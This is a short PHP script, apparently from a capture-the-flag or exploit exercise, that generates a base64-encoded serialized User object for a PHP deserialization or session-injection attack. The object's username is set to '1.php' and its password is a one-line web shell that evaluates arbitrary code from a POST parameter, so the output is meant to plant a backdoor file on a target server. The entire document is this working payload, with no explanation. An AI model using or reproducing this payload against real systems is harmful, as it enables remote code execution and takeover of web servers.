<?php
class User{
    public $username;
    public $password;
    function __construct(){
        $this->username = "1.php";
        $this->password = '<?php eval($_POST[0]);?>';
    }
}
echo base64_encode("|".serialize(new User()));
